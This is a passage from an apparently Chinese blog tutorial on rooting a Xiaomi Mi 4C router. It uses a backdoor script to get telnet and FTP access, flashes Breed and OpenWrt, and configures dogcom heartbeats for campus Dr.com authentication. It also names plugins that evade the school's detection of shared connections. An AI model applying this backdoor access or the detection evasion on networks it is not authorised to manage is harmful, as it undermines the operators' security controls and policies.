&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; len(data&lt;span style="color:#f92672"&gt;.&lt;/span&gt;split(&lt;span style="color:#e6db74"&gt;&amp;#34;.&amp;#34;&lt;/span&gt;)) &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;4&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; router_ip_address &lt;span style="color:#f92672"&gt;=&lt;/span&gt; data
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;break&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;添加 &lt;code&gt;router_ip_address&lt;/code&gt; 变量为你的管理后台地址，通常为 &lt;code&gt;192.168.31.1&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;router_ip_address &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;192.168.31.1&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来使用 MobaXterm 连接路由器，新建一个 session 类型选择 telnet，这时的路由器地址就是管理后台的地址应该是 &lt;code&gt;192.168.31.1&lt;/code&gt;，用户为 &lt;code&gt;root&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://img.braindance.top/article/2022/10/11/6345188f255ec.png"
loading="lazy"
alt="创建session"
&gt;&lt;/p&gt;
&lt;p&gt;ps：如果连接不成功就多运行几次 &lt;code&gt;0.start_main.bat&lt;/code&gt;。&lt;/p&gt;
&lt;h3 id="备份原路由器信息"&gt;备份原路由器信息
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;以下步骤请注意！！！&lt;/strong&gt;
最好备份以下路由器原本分区文件，以防不备之需，其中&lt;code&gt;eeprom.bin&lt;/code&gt; 是最重要的，因为刷入 breed 以后可能会导致 MAC 地址全 0，需要刷入一次这个文件才会恢复。执行以下命令，&lt;code&gt;of&lt;/code&gt; 后面的就是文件输出的路径&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;dd if=/dev/mtd0 of=/tmp/all.bin
dd if=/dev/mtd2 of=/tmp/bootloader.bin
dd if=/dev/mtd3 of=/tmp/eeprom.bin
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;打开电脑资源管理器，输入 &lt;code&gt;ftp://192.168.31.1&lt;/code&gt; 按回车，使用 ftp 连接路由器（为什么不用 MobaXterm，因为后门创建的 ftp 是匿名用户，直接使用 windows 资源管理器打开更方便）&lt;/p&gt;
&lt;p&gt;&lt;img src="https://img.braindance.top/article/2022/10/11/63451aca4e1e0.png"
loading="lazy"
alt="连接 ftp"
&gt;&lt;/p&gt;
&lt;p&gt;找到 &lt;code&gt;tmp&lt;/code&gt; 文件夹其中的三个文件：&lt;code&gt;all.bin&lt;/code&gt; 、&lt;code&gt;bootloader.bin&lt;/code&gt; 和 &lt;code&gt;eeprom.bin&lt;/code&gt;，复制到本地做备份，下载以后一定要看清楚三个文件的大小分别是 &lt;code&gt;16MB&lt;/code&gt; 、&lt;code&gt;64k&lt;/code&gt; 和 &lt;code&gt;64k&lt;/code&gt;，如果大小是 &lt;code&gt;1k&lt;/code&gt; 那就是错误的，再备份几次，也有可能是后门没写牢再执行 &lt;code&gt;0.start_main.bat&lt;/code&gt; 试试。&lt;/p&gt;
&lt;h3 id="上传-breed--文件并刷入"&gt;上传 Breed 文件并刷入
&lt;/h3&gt;&lt;p&gt;在资源管理器的 ftp 中把 &lt;code&gt;breed.bin&lt;/code&gt; 文件上传到 &lt;code&gt;/tmp&lt;/code&gt; 文件夹下，在 telnet 中执行指令刷入引导加载器&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;mtd write /tmp/breed.bin Bootloader
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;不提示错误信息就是刷入成功了。&lt;/p&gt;
&lt;h3 id="重启路由器进入-breed"&gt;重启路由器进入 Breed
&lt;/h3&gt;&lt;p&gt;拔掉路由器电源，用一根牙签类似的东西，插入路由器后面的 reset 孔不要松开，再插上电源，路由器灯会先闪一下，直到连续闪烁几次以后再松开 reset，这时路由器已经进入 breed 了，打开浏览器访问 &lt;code&gt;192.168.1.1&lt;/code&gt; 就可以看到 Breed 的界面（网络图片仅供参考，系统信息可能不一样）&lt;/p&gt;
&lt;p&gt;&lt;img src="https://img.braindance.top/article/2022/10/11/63451fb563c3a.png"
loading="lazy"
alt="Breed界面"
&gt;&lt;/p&gt;
&lt;p&gt;如果你在之后有不可挽回的错误操作，都可以通过以上操作进行复位重置。&lt;/p&gt;
&lt;h3 id="检查-mac-地址"&gt;检查 MAC 地址
&lt;/h3&gt;&lt;p&gt;进入 MAC 地址修改，通常你应该看到的前三个 MAC 地址应该是全0，这就需要刷入 一次之前的 &lt;code&gt;eeprom.bin&lt;/code&gt;。（网络图片仅供参考）&lt;/p&gt;
&lt;p&gt;&lt;img src="https://img.braindance.top/article/2022/10/11/6345201b6c592.png"
loading="lazy"
alt="MAC 地址修改"
&gt;&lt;/p&gt;
&lt;p&gt;进入&lt;strong&gt;固件更新&lt;/strong&gt; （界面同下面），勾选 &lt;strong&gt;EEPORM&lt;/strong&gt;，选择文件 &lt;code&gt;eeprom.bin&lt;/code&gt;，其他的都不要动，然后上传，根据提示更新，之后会重新回到 Breed 控制台。&lt;/p&gt;
&lt;h2 id="刷入-openwrt"&gt;刷入 openwrt
&lt;/h2&gt;&lt;p&gt;同样在 Breed 控制台选择&lt;strong&gt;固件更新&lt;/strong&gt; ，勾选&lt;strong&gt;固件&lt;/strong&gt;，选择 &lt;code&gt;Mi4C.bin&lt;/code&gt; openwrt 固件文件，根据提示上传安装。（网络图片仅供参考）&lt;/p&gt;
&lt;p&gt;&lt;img src="https://img.braindance.top/article/2022/10/11/634527710db18.png"
loading="lazy"
alt="固件更新"
&gt;&lt;/p&gt;
&lt;p&gt;之后路由器灯会全灭，然后电源灯进入&lt;strong&gt;黄色闪烁&lt;/strong&gt;的状态，就是正在安装，等待安装成功以后等会变成&lt;strong&gt;蓝色&lt;/strong&gt;，之后就可以访问 &lt;code&gt;192.168.1.1&lt;/code&gt; 进入openwrt 管理后台页面，默认密码为 &lt;code&gt;password&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://img.braindance.top/article/2022/10/11/634524441d739.png"
loading="lazy"
alt="openwrt 界面"
&gt;&lt;/p&gt;
&lt;p&gt;说一下 &lt;code&gt;Mi4C.bin&lt;/code&gt; 这个openw 的固件。这个固件来自前面提到的广东工业大学项目中的 &lt;a class="link" href="https://github.com/shengqiangzhang/Drcom-GDUT-HC5661A-OpenWrt/issues/27" target="_blank" rel="noopener"
&gt;issue&lt;/a&gt;，是一位同学自己找人定制的一份固件并且免费分享出来了，其中已经内置了 Dr.com 插件（用来发送心跳包）及防检测插件（ttl，ipid，cookieflash，ua2f 最新版），非常感谢这位同学的分享。&lt;/p&gt;
&lt;h3 id="配置-pppoe-拨号"&gt;配置 PPPoE 拨号
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;前置条件&lt;/strong&gt;：宿舍上面的AP接口插入路由器的 WAN 口&lt;/p&gt;
&lt;p&gt;选择 网络 &amp;mdash;&amp;gt; 接口，点击 &lt;code&gt;WAN&lt;/code&gt; 接口对应的 编辑（Edit）按钮。&lt;/p&gt;
&lt;p&gt;下面图中是我的已经配置好的界面，初次进入应该是有个 &lt;code&gt;WAN&lt;/code&gt; 和 &lt;code&gt;WAN6&lt;/code&gt; 接口，它们两个的下面并不是我图中的 &lt;code&gt;pppoe-wan&lt;/code&gt;，应该是 &lt;code&gt;eht0.2&lt;/code&gt;。&lt;code&gt;WAN6&lt;/code&gt; 接口是一个 DHCP IPV6 客户端，它和 &lt;code&gt;WAN&lt;/code&gt; 接口是同一个物理接口，留着也不影响 。&lt;code&gt;LAN&lt;/code&gt; 口尽量不要动。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://img.braindance.top/article/2022/10/11/63452a57015e9.png"
loading="lazy"
alt="网络接口配置"
&gt;&lt;/p&gt;
&lt;p&gt;通信协议选择 &lt;code&gt;PPPoE&lt;/code&gt; 然后点击出现的&lt;strong&gt;切换协议&lt;/strong&gt;按钮。然后根据下表填入信息&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PAP/CHAP 用户名。校园网账号，前置知识中的&lt;code&gt;\r\n****@***&lt;/code&gt;格式。&lt;/li&gt;
&lt;li&gt;PAP/CHAP 密码。校园网密码。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其他的不用动，请仔细检查校园网账号和密码是否正确。之后点击保存退出后，点击界面右下角的&lt;strong&gt;保存并应用&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://img.braindance.top/article/2022/10/11/63452de3e1732.png"
loading="lazy"
alt="1665478137525.png"
&gt;&lt;/p&gt;
&lt;p&gt;PPPoE 部分配置完成。但是校园网目前还不能用。&lt;/p&gt;
&lt;h3 id="配置无线网络"&gt;配置无线网络
&lt;/h3&gt;&lt;p&gt;选择 网络 &amp;mdash;&amp;gt; 无线，如果提示已禁用就点击启用，只有一个你可以点击编辑的按钮。&lt;code&gt;ESSID&lt;/code&gt; 就是设备搜索到的无线网名称。网络是 &lt;code&gt;LAN&lt;/code&gt; 接口就不用动。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://img.braindance.top/article/2022/10/11/63452e4608e41.png"
loading="lazy"
alt="无线网名称配置"
&gt;&lt;/p&gt;
&lt;p&gt;选择 无线安全 配置无线网密码，加密选择 &lt;code&gt;WPA2-PSK&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://img.braindance.top/article/2022/10/11/63452e93b28bc.png"
loading="lazy"
alt="无线网密码配置"
&gt;&lt;/p&gt;
&lt;p&gt;无线网络部分配置完成。&lt;/p&gt;
&lt;h3 id="配置管理后台密码"&gt;配置管理后台密码
&lt;/h3&gt;&lt;p&gt;&lt;code&gt;192.168.1.1&lt;/code&gt; 管理后台默认密码 &lt;code&gt;password&lt;/code&gt; 容易被进入，进入 系统 &amp;mdash;&amp;gt; 管理权，可以更改访问后台管理员的密码。&lt;/p&gt;
&lt;h2 id="校园网认证"&gt;校园网认证
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;前置条件&lt;/strong&gt;：配置好 PPPoE 拨号&lt;/p&gt;
&lt;p&gt;在前面我们已经成功配置了 PPPoE 拨号，但是要记得校园网还要发送心跳包保证在线状态。这部分主要解决发送心跳包的问题。&lt;/p&gt;
&lt;p&gt;还需要说一下，发送心跳包的主要原理来自 &lt;a class="link" href="https://github.com/drcoms/drcom-generic" target="_blank" rel="noopener"
&gt;drcom-generic&lt;/a&gt; 项目，广工大项目中使用的 Dr.com 插件是这个项目的 openwrt 插件版本，并且现在刷入的 openwrt 固件自带的也是这个插件，我并没用使用成功。最终是结合了学校贴吧老哥使用的 &lt;a class="link" href="https://github.com/mchome/dogcom" target="_blank" rel="noopener"
&gt;dogcom&lt;/a&gt; 才成功，dogcom 则是前面那个项目的 C 语言实现版本。&lt;/p&gt;
&lt;h3 id="删除-drcom-插件"&gt;删除 Dr.com 插件
&lt;/h3&gt;&lt;p&gt;在使用 dogcom 之前，需要把之前的 Dr.com 插件删除，因为会造成重复发包的问题导致无法认证。&lt;/p&gt;
&lt;p&gt;进入 系统 &amp;mdash;&amp;gt; 软件包，在界面中筛选器部分搜索 drcom 或者 gdut （记不清了），然后选择 已安装列表，搜索到的软件包点击移除按钮，自动移除未使用的依赖可以取消勾选。&lt;/p&gt;
&lt;h3 id="通过-openwrt-提供的-ssh-连接路由器"&gt;通过 openwrt 提供的 ssh 连接路由器
&lt;/h3&gt;&lt;p&gt;openwrt 安装成功以后其实就可以通过 ssh 连接路由器了，使用 MobaXterm 连接路由器。这时连接的地址是 &lt;code&gt;192.168.1.1&lt;/code&gt;，用户名是 &lt;code&gt;root&lt;/code&gt;，密码是你 openwrt 的&lt;strong&gt;管理后台密码&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://img.braindance.top/article/2022/10/11/6345354d1c8b6.png"
loading="lazy"
alt="ssh连接"
&gt;&lt;/p&gt;
&lt;p&gt;MobaXterm 使用 ssh 连接以后左边会自己创建一个 ftp 连接，就是图中的框框部分&lt;/p&gt;
&lt;p&gt;&lt;img src="https://img.braindance.top/article/2022/10/11/634535f1bcec4.png"
loading="lazy"
alt="1665480198855.png"
&gt;&lt;/p&gt;
&lt;p&gt;上面蓝色选中的部分是当前的路径，可以修改当前所在路径，通过拖拽可以直接上传文件&lt;/p&gt;
&lt;h3 id="安装-dogcom"&gt;安装 dogcom
&lt;/h3&gt;&lt;p&gt;dogcom 安装方式有两种， 一种是使用 openwrt 版本的通过 opkg 软件包管理器安装，另一种是通过 ftp 上传 dogcom 可执行文件到 &lt;code&gt;/usr/bin/&lt;/code&gt; 文件夹中。就算使用 opkg 软件包安装，两个最后的结果都是一样的，就是在 &lt;code&gt;/usr/bin/&lt;/code&gt; 文件夹中有一个 dogcom 的可执行文件。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;方法一：使用 opkg 软件包安装&lt;/p&gt;
&lt;p&gt;还是在系统 &amp;mdash;&amp;gt; 软件包界面，有一个上传软件包按钮，点击上传下载的压缩包 &lt;code&gt;dogcom.zip&lt;/code&gt; 中的 &lt;code&gt;dogcom_v1.6.2-1_mipsel_24kc.ipk&lt;/code&gt;，之后执行安装即可。&lt;/p&gt;
&lt;p&gt;也可以通过 ftp 把文件上传到 &lt;code&gt;/tmp&lt;/code&gt; 文件夹中，然后在控制台执行&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;opkg install /tmp/dogcom_v1.6.2-1_mipsel_24kc.ipk
&lt;/code&gt;&lt;/pre&gt;&lt;ol start="2"&gt;
&lt;li&gt;方法二：通过 ssh 上传到指定目录
在左侧的 ftp 界面上面路径输入 &lt;code&gt;/usr/bin&lt;/code&gt; 进入文件夹，然后拖动名为 &lt;strong&gt;dogcom&lt;/strong&gt; 的文件上传到该目录。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;通过以上方法两个方法上传安装 dogcom 以后，可以在控制台执行&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/usr/bin/dogcom -h
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;测试软件是否可用，软件输出为&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;root@iapp:~# /usr/bin/dogcom
Drcom-generic implementation in C.
Version: 1.6.2
Usage:
dogcom -m &amp;lt;dhcp/pppoe&amp;gt; -c &amp;lt;FILEPATH&amp;gt; [options &amp;lt;argument&amp;gt;]...
Options:
--mode &amp;lt;dhcp/pppoe&amp;gt;, -m &amp;lt;dhcp/pppoe&amp;gt; set your dogcom mode
--conf &amp;lt;FILEPATH&amp;gt;, -c &amp;lt;FILEPATH&amp;gt; import configuration file
--bindip &amp;lt;IPADDR&amp;gt;, -b &amp;lt;IPADDR&amp;gt; bind your ip address(default is 0.0.0.0)
--log &amp;lt;LOGPATH&amp;gt;, -l &amp;lt;LOGPATH&amp;gt; specify log file
--daemon, -d set daemon flag
--802.1x, -x enable 802.1x
--eternal, -e set eternal flag
--verbose, -v set verbose flag
--help, -h display this help
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;视为成功。&lt;/p&gt;
&lt;h3 id="上传-dogcom-配置文件"&gt;上传 dogcom 配置文件
&lt;/h3&gt;&lt;p&gt;可以参考上一节安装 dogcom 的方法二，使用 ftp 上传 &lt;code&gt;dogcom.conf&lt;/code&gt; 文件到 &lt;code&gt;/usr/&lt;/code&gt; 目录下。这个 &lt;code&gt;dogcom.conf&lt;/code&gt; 内容是发送心跳包的配置文件，来源是通过 &lt;a class="link" href="https://github.com/drcoms/drcom-generic" target="_blank" rel="noopener"
&gt;drcom-generic&lt;/a&gt; 项目教程，使用 Wireshark 软件进行抓包并使用 &lt;a class="link" href="http://drcoms.github.io/drcom-generic/" target="_blank" rel="noopener"
&gt;在线配置器&lt;/a&gt; 获得的，如果以后校园网配置更改还需要自行抓包测试。&lt;code&gt;dogcom.conf&lt;/code&gt; 的内容如下&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;server = &amp;#39;1.1.1.1&amp;#39;
pppoe_flag = &amp;#39;\x2f&amp;#39;
keep_alive2_flag = &amp;#39;\xdb&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id="配置-pppoe-拨号文件"&gt;配置 PPPoE 拨号文件
&lt;/h3&gt;&lt;p&gt;在 ssh 中按照顺序执行以下指令，&lt;strong&gt;这一步十分的重要！！！&lt;/strong&gt;：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;cp /lib/netifd/proto/ppp.sh /lib/netifd/proto/ppp.sh_bak
sed -i &amp;#39;/proto_run_command/i username=`echo -e &amp;#34;$username&amp;#34;`&amp;#39; /lib/netifd/proto/ppp.sh
sed -i &amp;#39;/proto_run_command/i password=`echo -e &amp;#34;$password&amp;#34;`&amp;#39; /lib/netifd/proto/ppp.sh
chmod 777 /usr/bin/dogcom
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;之后就可以执行&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/usr/bin/dogcom -m pppoe -c /usr/drcom.conf -e -d &amp;amp;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;dogcom 会自动启用一个守护进程发送心跳包认证，为了保证每次路由器重启以后自动连接校园网并认证，建议在 openwrt 管理页面的 系统 &amp;mdash;&amp;gt; 计划任务 中添加本地启动脚本&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;sleep 10 &amp;amp;&amp;amp; /usr/bin/dogcom -m pppoe -c /usr/drcom.conf -e -d &amp;amp;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://img.braindance.top/article/2022/10/11/63453a962923a.png"
loading="lazy"
alt="1665481387645.png"
&gt;&lt;/p&gt;
&lt;h3 id="查看校园网是否成功认证"&gt;查看校园网是否成功认证
&lt;/h3&gt;&lt;p&gt;配置完成后，重启路由器，并请耐心等待若干分钟（3分钟内），重新回到 openwrt 管理页面的 网络 &amp;mdash;&amp;gt; 接口中，查看 &lt;code&gt;WAN&lt;/code&gt; 接口 PPPoE 是否拨号成功，如果运行时间、发送、接受均有数据，并且 IPv4 获得的一个地址，则说明路由器已经可以上网了。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://img.braindance.top/article/2022/10/11/63453da03857e.png"
loading="lazy"
alt="拨号成功"
&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;wan中，学号密码输入错误。&lt;/p&gt;
&lt;p&gt;路由器的wan没有与校园网端口连接&lt;/p&gt;
&lt;p&gt;网线断了，或者路由器坏了&lt;/p&gt;
&lt;p&gt;压根没开通校园网&lt;/p&gt;
&lt;p&gt;dogcom 插件中，校园网心跳配置已经更改&lt;/p&gt;
&lt;p&gt;端口被学校网络中心拉黑了&lt;/p&gt;&lt;/blockquote&gt;
&lt;h2 id="挖个坑"&gt;挖个坑
&lt;/h2&gt;&lt;h3 id="校园网防检测"&gt;校园网防检测
&lt;/h3&gt;&lt;p&gt;常见的四种检测：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;基于 IPv4 数据包包头内的 TTL 字段的检测（固定TTL）&lt;/li&gt;
&lt;li&gt;基于 HTTP 数据包请求头内的 User-Agent 字段的检测(UA2F)&lt;/li&gt;
&lt;li&gt;DPI (Deep Packet Inspection) 深度包检测技术）（不常用）&lt;/li&gt;
&lt;li&gt;基于 IPv4 数据包包头内的 Identification 字段的检测（rkp-ipid 设置 IPID）&lt;/li&gt;
&lt;li&gt;基于网络协议栈时钟偏移的检测技术（防时钟偏移检测）&lt;/li&gt;
&lt;li&gt;Flash Cookie 检测技术（iptables 拒绝 AC 进行 Flash 检测 不常用）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;大佬讲解文章：https://catalog.chn.moe/&lt;/p&gt;
&lt;p&gt;广东工业大学项目：https://github.com/shengqiangzhang/Drcom-GDUT-HC5661A-OpenWrt#步骤六配置防检测&lt;/p&gt;
&lt;h3 id="校园网经常掉线"&gt;校园网经常掉线
&lt;/h3&gt;&lt;p&gt;2022.10.31 更新&lt;/p&gt;
&lt;p&gt;自己从网上找了一个检测断网并自动重新拨号的脚本，配合定时任务每天凌晨 4 点重启，已经用了 20 多天了感觉还不错，分享一波代码。可以在任意目录下创建一个 ping 文件夹（但是需要自己改下某些配置路径），下面的例子是在 /root/ping 目录里放的脚本。脚本包括产生的日志有三个文件：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ping.sh。每间隔 &lt;code&gt;SLEEP_SEC&lt;/code&gt; 时间测试两个外网地址能否访问，超过 &lt;code&gt;PING_SUM&lt;/code&gt; 次数无法访问判断为拨号掉线，重启 wan 口进行拨号。产生的日志文件存放到 &lt;code&gt;/root/ping/log.txt&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;daemon.sh。检测 ping.sh 进程是否存活，如果不存在进程则重启进程；判断日志文件超过 50MB 清空日志文件。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;ping.sh&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#!/bin/sh
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;PING_SUM&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;5&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#ping interval&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;SLEEP_SEC&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#连续重启网卡 REBOOT_CNT 次网络都没有恢复正常，重启软路由&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#时间= (SLEEP_SEC * PING_SUM + 20) * REBOOT_CNT&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;REBOOT_CNT&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;30&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;LOG_PATH&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;/root/ping/log.txt&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;cnt&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;reboot_cnt&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;while&lt;/span&gt; :
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ping -c &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt; -W &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt; 114.114.114.114 &amp;gt; /dev/null
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ret&lt;span style="color:#f92672"&gt;=&lt;/span&gt;$?
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ping -c &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt; -W &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt; 223.6.6.6 &amp;gt; /dev/null
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ret2&lt;span style="color:#f92672"&gt;=&lt;/span&gt;$?
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; &lt;span style="color:#f92672"&gt;[[&lt;/span&gt; $ret -eq &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt; &lt;span style="color:#f92672"&gt;||&lt;/span&gt; $ret2 -eq &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt; &lt;span style="color:#f92672"&gt;]]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; echo &lt;span style="color:#e6db74"&gt;&amp;#39;Network OK!&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; cnt&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; reboot_cnt&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; cnt&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;`&lt;/span&gt;expr $cnt + 1&lt;span style="color:#e6db74"&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; echo -n &lt;span style="color:#e6db74"&gt;`&lt;/span&gt;date &lt;span style="color:#e6db74"&gt;&amp;#39;+%Y-%m-%d %H:%M:%S&amp;#39;&lt;/span&gt;&lt;span style="color:#e6db74"&gt;`&lt;/span&gt; &amp;gt;&amp;gt; $LOG_PATH
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; printf &lt;span style="color:#e6db74"&gt;&amp;#39;-&amp;gt; [%d/%d] Network maybe disconnected,checking again after %d seconds!\r\n&amp;#39;&lt;/span&gt; $cnt $PING_SUM $SLEEP_SEC &amp;gt;&amp;gt; $LOG_PATH
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; printf &lt;span style="color:#e6db74"&gt;&amp;#39;-&amp;gt; [%d/%d] Network maybe disconnected,checking again after %d seconds!\r\n&amp;#39;&lt;/span&gt; $cnt $PING_SUM $SLEEP_SEC
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; &lt;span style="color:#f92672"&gt;[&lt;/span&gt; $cnt &lt;span style="color:#f92672"&gt;==&lt;/span&gt; $PING_SUM &lt;span style="color:#f92672"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;then&lt;/span&gt;
